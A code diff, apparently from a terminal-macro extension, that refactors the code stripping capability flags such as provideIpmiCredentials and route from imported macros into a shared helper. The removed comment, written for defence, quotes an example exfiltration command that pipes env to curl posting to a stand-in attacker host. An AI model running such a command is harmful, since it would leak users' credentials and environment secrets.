@@ -7,6 +7,7 @@ import type { AuthProfile, LocalShellProfile, ServerConfig, ServerOrigin, Tunnel
 import type { InventorySourceConfig } from "../models/inventory";
 import { inventorySecretKey } from "../models/inventory";
 import type { MacroVariable, TerminalMacro } from "../models/terminalMacro";
+import { stripImportedCapabilityFields } from "../models/terminalMacro";
 import { isValidVariableName, MAX_MACRO_VARIABLES, withRedactedVariables } from "../services/macroVariables";
 import { sanitizeMacroFolderList, sanitizeMacroGroup } from "../services/macroFolders";
 import type { SecretVault } from "../services/ssh/contracts";
@@ -1041,47 +1042,16 @@ function sanitizeImportedMacroVariables(macro: TerminalMacro): boolean {
   return hadDeclaration;
 }
 
-/**
- * CAPABILITY FLAGS — stripped on EVERY import path, no exceptions (issue #48
- * §3.3). Consent belongs to the user who ticked the box in THIS installation.
- *
- * WHY THIS LIST EXISTS AT ALL. `sanitizeImportedMacro` starts from
- * `{ ...raw }` and removes only the fields it has been taught are dangerous, so
- * an additive field it has never heard of survives verbatim and is persisted.
- * A shared macro carrying `provideIpmiCredentials: true` — with text as
- * innocuous as `env | curl -X POST https://attacker/…` — would therefore import
- * ALREADY ARMED, and its first run would hand over the fleet-wide BMC password
- * with the importing user never having seen a checkbox. The gate would be sound
- * and the feature still unsafe, defeated by a field the sanitizer does not know
- * exists.
- *
- * BOTH INGEST PATHS, and deliberately not a share-only rule. The tempting split
- * is "a share bundle is foreign, a backup is the user's own export, so keep the
- * flag there". Rejected: provenance is not knowable at this point (a backup is
- * an ordinary file on disk — nothing distinguishes your own export from a
- * colleague's, or one downloaded from a ticket), both paths already funnel
- * through this one function, and the recovery cost is re-ticking a checkbox
- * against a failure cost of a silent credential disclosure.
- *
- * A NEW CAPABILITY FLAG MUST BE ADDED HERE AS PART OF ADDING IT — treat this
- * list as part of the definition, not as follow-up work. `route` (issue #48
- * PR-C, "run this macro on the server's IPMI gateway") is listed ahead of its
- * own implementation for exactly that reason: it chooses an EXECUTION HOST, so
- * an imported macro carrying it would run its author's command in an SSH session
- * on the importer's bastion — usually the most privileged box in the topology.
- * A field the sanitizer strips before it exists costs nothing; one it learns
- * about afterwards costs a release.
- */
-const IMPORTED_CAPABILITY_FIELDS = ["provideIpmiCredentials", "route"] as const;
-
 function sanitizeImportedMacro(raw: TerminalMacro): TerminalMacro {
-  const macro: TerminalMacro = { ...raw };
-  // Deleted, never normalized to `false`: a stored `false` is a key the editor
-  // would render as an explicit choice, and re-exporting it would carry a
-  // decision the importing user never made.
-  for (const field of IMPORTED_CAPABILITY_FIELDS) {
-    delete (macro as unknown as Record<string, unknown>)[field];
-  }
+  // CAPABILITY FLAGS are stripped on EVERY import path — this backup/share path
+  // and the legacy-settings absorb in `persistLegacyMigration`
+  // (storage/vscodeMacroStore.ts) — from one shared definition
+  // (`stripImportedCapabilityFields`, models/terminalMacro.ts). See that
+  // module's `IMPORTED_CAPABILITY_FIELDS` doc for why consent never survives an
+  // import and why a new flag must join the list as part of adding it. The strip
+  // deletes rather than normalizes to `false`, so a re-export carries no decision
+  // the importing user never made.
+  const macro: TerminalMacro = stripImportedCapabilityFields(raw);
   // A non-string keybinding is dropped for the same reason a malformed string one is: it is
   // not a binding. `normalizeBinding()` already refuses to resolve it, so this changes nothing
   // the app applies — it keeps an unusable value out of globalState, where it would sit in a
